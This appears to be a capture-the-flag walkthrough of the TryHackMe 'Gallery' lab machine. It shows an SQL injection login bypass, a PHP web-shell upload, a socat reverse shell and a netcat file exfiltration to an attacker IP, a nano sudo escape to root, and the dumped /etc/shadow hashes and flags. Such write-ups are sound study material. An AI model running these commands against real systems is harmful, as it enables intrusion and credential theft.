# Recon

### Nmap

```bash
nmap -vvv -Pn -sC -sV -oN /opt/THM/Gallery/1-recon/nmap/nmap_init.md 10.10.82.219
```

```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3299B8CC25F07C2434BE8A9B16FCCB47
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set


```

# Enumeration

### WEB

port 80

```
http://10.10.82.219/
```

apache2 default page

port 8008 redirects to a gallery page

```
http://10.10.82.219:8080/
```

![[gallery-login.png]]

using gobuster on port 80, we find the same gallery page

```
/gallery              (Status: 301) [Size: 316] [--> http://10.10.82.219/gallery/]
/server-status        (Status: 403) [Size: 278]
```

looking for exploits using searchsploit

```
searchsploit simple image gallery
```

```
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------
Joomla Plugin Simple Image Gallery Extended  | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image G | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execu | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL I | php/webapps/50198.txt
--------------------------------------------- ---------------------------------
Shellcodes: No Results
```
# Exploitation

### Exploit-DB 50214

https://www.exploit-db.com/exploits/50214

the payload is an SQL injection, resulting in a login

the password is left blank, the username is set to something that is true

```py
username": "admin' or '1'='1'#", "password": ""
```

http://10.10.82.219/gallery/

we will login with the following credentials (no password)

```
admin' or '1'='1'#

```

![[suclogin.png]]

we navigate to the account section for the admin

![[admin_acc.png]]

http://10.10.82.219/gallery/?page=user

from here, we can upload file by using the change avatar function of the admin

![[admin_info.png]]

we can use php bash, a tool that will give us basic command line access to the machine.

https://github.com/Arrexel/phpbash/blob/master/phpbash.php

upload phpbash, then navigate to it. to navigate to it, right click on the avatar picture (it is blank because it is not a real image jus tthe php file) and click open in new tab

for this example the url is at the following address

http://10.10.82.219/gallery/uploads/1732115340_phpbash.php

the upload url might change, so make sure to find it using the navigation teqnique shared previously

![[malavatar.png]]

and we have a shell as www-data


![[phpbashworking.png]]

# Privilege Escalation

### User

we can see that there are some users in the home directory

```
/home/mike
/home/ubuntu
```

we can't do much else, so we will try to upgrade the shell to a tty session

upgrade shell to a tty session with socat

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
socat file:`tty`,raw,echo=0 tcp-listen:1337
```

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.18.190:1337
```

```
www-data@gallery:/dev/shm$ whoami
www-data
www-data@gallery:/dev/shm$ uname -a
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

from here lets look for more privilege escalation opportunities

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
postfix:x:110:114::/var/spool/postfix:/usr/sbin/nologin
mike:x:1001:1001:mike:/home/mike:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

looks like the root user owns the /home/ubuntu directory

```
[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root root 4.0K May 20  2021 .
drwxr-xr-x 23 root root 4.0K Feb 12  2022 ..
drwxr-xr-x  6 mike mike 4.0K Aug 25  2021 mike
drwx------  4 root root 4.0K May 20  2021 ubuntu
```

just some things from LinEnum and linpeas...

```
[-] MYSQL version:
mysql  Ver 15.1 Distrib 10.1.48-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

```

/etc/mysql/mariadb.cnf

```
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-33

```

sending the initialize.php file back to our attacker machine with netcat

On attacker server:
```bash
nc -l -p 1234 -q 1 > gallery-initialize.php < /dev/null
```

On target server:

```bash
cat /var/www/html/gallery/initialize.php | netcat 10.6.18.190 1234
```

we can see the credentials for the user

```
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

connect to the mysql database using the credentials,

the following commands result in user information

```
mysql -u gallery_user -p
passw0rd321

show databases;

use gallery_db;

show tables;

select * from users;
```

```
+----+--------------+----------+----------+----------------------------------+--------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                         | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+--------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1732116120_phpbash.php | NULL       |    1 | 2021-01-20 14:02:37 | 2024-11-20 15:22:51 |
+----+--------------+----------+----------+----------------------------------+--------------------------------+------------+------+---------------------+---------------------+

```


interesting backup
```
╔══════════╣ Backup folders
drwx------ 2 root root 4096 May 20  2021 /etc/lvm/backup
drwxr-xr-x 3 root root 4096 Nov 20 15:21 /var/backups
total 52
-rw-r--r-- 1 root root 34789 Feb 12  2022 apt.extended_states.0
-rw-r--r-- 1 root root  3748 Aug 25  2021 apt.extended_states.1.gz
-rw-r--r-- 1 root root  3516 May 21  2021 apt.extended_states.2.gz
-rw-r--r-- 1 root root  3575 May 20  2021 apt.extended_states.3.gz
drwxr-xr-x 5 root root  4096 May 24  2021 mike_home_backup

```

```
cd /var/backups/mike_home_backup
```

it seems to be a copy of /home/mike

```
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Nov 20 15:21 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
```

checking the bash history

```
cat /var/backups/mike_home_backup/.bash_history
```

```
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

thanks linpeas

```
╔══════════╣ Searching passwords in history files
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l

```


we see a login attempt with the following password

```
b3stpassw0rdbr0xx
```

we change users to mike

/home/mike/user.txt

```
THM{af05cd30bfed67849befd546ef}
```

### Root

checking for sudo privileges, we are immediately drawn to /opt/rootkit.sh

```
www-data@gallery:/var/backups/mike_home_backup$ su mike
Password: 
mike@gallery:/var/backups/mike_home_backup$ whoami
mike
mike@gallery:/var/backups/mike_home_backup$ uname -a
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
mike@gallery:/var/backups/mike_home_backup$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

/opt/rootkit.sh

```
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

we cannot edit it, but we can run it with sudo permissions

```
sudo /bin/bash /opt/rootkit.sh
```

getting a shell with nano

https://gtfobins.github.io/gtfobins/nano/#shell

```
It can be used to break out from restricted environments by spawning an interactive system shell.
```

```
nano
^R^X
reset; sh 1>&0 2>&0
```

```
The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
```

```
nano -s /bin/sh
/bin/sh
^T
```

try to use the read option, getting unkown terminal, need to do some modifications to our reverse shell

https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys#script

```
export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

running the script again
```
sudo /bin/bash /opt/rootkit.sh
```

executing these commands while in nano
```
^R
^X
reset; bash 1>&0 2>&0
```


we have a  root shell

```
root@gallery:/opt# whoami
root
root@gallery:/opt# uname -a
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
root@gallery:/opt# sudo -l
Matching Defaults entries for root on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on gallery:
    (ALL : ALL) ALL
```

/root/root.txt

```
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

/etc/shadow
```
root:$6$hX.HS5qJ$2dz.peyWB5RyF2HgVF20BCR8xt6K2x7FUhdUe0PeextDLjo1tu9Cq9CYt.5XhueUXxMabMJ1pyuIdskVtdTb2/:18767:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
ubuntu:$6$iWrPbNFB$XyAZA38W7wysvrQGjt6txpv8GtL0cOy85hsJoJuxTzmlI1QYRxvXrS.CeSb0PkRyciPqUnshcAabCABgpQh7Y.:18769:0:99999:7:::
postfix:*:18767:0:99999:7:::
mike:$6$EWcAUHOS$lpHi2TY7i5S/Fpzj3Qbr3eWjXwE2NQphqJyOAncZTLNeSZxAN/hQUcs6LjTE8iQ3XQ09Sl9c3rATxVQ313Flk0:18767:0:99999:7:::
mysql:!:18864:0:99999:7:::
```